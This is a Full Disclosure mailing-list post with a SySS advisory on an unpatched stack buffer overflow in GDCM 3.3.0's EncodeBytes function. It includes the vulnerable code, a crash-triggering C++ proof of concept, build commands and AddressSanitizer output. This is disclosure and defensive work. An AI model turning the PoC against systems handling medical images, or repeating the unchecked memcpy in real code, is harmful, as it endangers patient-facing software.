---
title: [SYSS-2026-068]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)
url: https://seclists.org/fulldisclosure/2026/Sep/84
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:56:58.728058
---

# [SYSS-2026-068]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](71)
[By Date](date.html#84)
[![Next](/images/right-icon-16x16.png)](85)

[![Previous](/images/left-icon-16x16.png)](71)
[By Thread](index.html#84)
[![Next](/images/right-icon-16x16.png)](85)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-068]: GDCM (Grassroots DICOM) - Stack-based Buffer Overflow (CWE-121)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 23 Sep 2026 15:33:26 +0200

---

```
Advisory ID:               SYSS-2026-068
Product:                   GDCM (Grassroots DICOM)
Manufacturer:              GDCM Project
Affected Version(s):       3.3.0
Tested Version(s):         3.3.0
Vulnerability Type:        Stack-based Buffer Overflow (CWE-121)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-07-24
Public Disclosure:         2026-09-23
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

GDCM (Grassroots DICOM) is an open-source C++ library for reading, writing,
and processing DICOM (Digital Imaging and Communications in Medicine)
medical imaging files (see [1]).

The library function gdcm::System::EncodeBytes, defined in
Source/Common/gdcmSystem.cxx, is vulnerable to a stack-based buffer
overflow. The function uses a fixed-size 32-byte stack buffer and copies
caller-provided data into it via memcpy() without checking the size
parameter against the buffer capacity. If a caller invokes EncodeBytes
with a size value greater than 32, a stack buffer overflow occurs,
potentially leading to a process crash or arbitrary code execution in
the context of the user running the application.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The EncodeBytes function is a public static method of the
gdcm::System class (declared in Source/Common/gdcmSystem.h). Its purpose
is to convert a byte array (e.g. a UUID) into its decimal string
representation. The vulnerable code at Source/Common/gdcmSystem.cxx:620
is the following:
```

 size\_t System::EncodeBytes(char \*out, const unsigned char \*data, int
size)

```
  {
    bool zero = false;
    std::string sres;
    unsigned char buffer[32];        // 32-byte stack buffer
    unsigned char *addr = buffer;
    memcpy(addr, data, size);        // BUG: no bounds check on 'size'
    while(!zero)
      {
      int res = getlastdigit(addr, size);
      const char v = (char)('0' + res);
      sres.insert(sres.begin(), v);
      zero = true;
      for(int i = 0; i < size; ++i)
        {
        zero = zero && (addr[i] == 0);
        }
      }

    //return sres;
    strcpy(out, sres.c_str()); //, sres.size() );
    return sres.size();
  }

The 'size' parameter is passed directly to memcpy() without validation
against the 32-byte buffer capacity. Additionally, the subsequent
getlastdigit() call and the loop iterating 'size' elements
all operate without bounds checks.

Since EncodeBytes is a public API, any downstream application that links
against GDCM and calls System::EncodeBytes with size > 32 is vulnerable.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

A PoC was developed that calls the actual gdcm::System::EncodeBytes
function from a C++ program linked against the GDCM library, passing
a size value of 48 to overflow the 32-byte stack buffer.

PoC source code:

#include <gdcmSystem.h>
#include <cstdio>
#include <cstring>

int main()
{
    const int overflow_size = 48;  // Exceeds the 32-byte buffer by 16
    unsigned char data[overflow_size];
    memset(data, 0x41, overflow_size);  // 'A' pattern

    char outbuf[256];
    size_t len = gdcm::System::EncodeBytes(outbuf, data, overflow_size);
    printf("EncodeBytes returned length: %zu\n", len);
    return 0;
}

To build and run the PoC, first compile GDCM with AddressSanitizer
(ASan) and then compile the PoC linking against the library:

mkdir -p /tmp/gdcmbin
cmake -S . -B /tmp/gdcmbin \
  -DGDCM_BUILD_SHARED_LIBS=OFF \
  -DGDCM_BUILD_APPLICATIONS=OFF \
  -DGDCM_BUILD_TESTING=OFF \
  -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g" \
  -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address"
make -C /tmp/gdcmbin -j$(nproc) gdcmCommon

g++ -fsanitize=address -fno-omit-frame-pointer -g \
  -ISource/Common \
  pocs/poc1_encodebytes_stack_overflow.cpp \
  /tmp/gdcmbin/bin/libgdcmCommon.a -o poc1

Running the PoC triggers the stack buffer overflow, detected by ASan:

  $ ./poc1
  ==2703==ERROR: AddressSanitizer: stack-buffer-overflow on address
  0x7bb2b18f00c0 at pc 0x7fb2b4329714 bp 0x7ffeeda00b20 sp 0x7ffeeda002c8
  WRITE of size 48 at 0x7bb2b18f00c0 thread T0
      #0 0x7fb2b4329713 in memcpy (/usr/lib/libasan.so.8+0x129713)
```

 #1 0x560ee48da325 in gdcm::System::EncodeBytes(char\*, unsigned
char const\*, int)

```
          Source/Common/gdcmSystem.cxx:626
      [160, 192) 'buffer' (line 624) <== Memory access at offset 192
      overflows this variable

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-07-24: Vulnerability reported to manufacturer
2026-07-31: Vulnerability reported to manufacturer again
2026-09-23: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] GDCM project website
    https://gdcm.sourceforge.net/
[2] SySS Security Advisory SYSS-2026-068
```

<https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-068.txt>

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key:
<https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc>

```
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-84/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](71)
[By Date](date.html#84)
[![Next](/images/right-icon-16x16.png)](85)

[![Previous](/images/left-icon-16x16.png)](71)
[By Thread](index.html#84)
[![Next](/images/right-icon-16x16.png)](85)

### Current thread:

* **[SYSS-2026-068]: GDCM (Grassroots DICOM) - Stack-based Buff...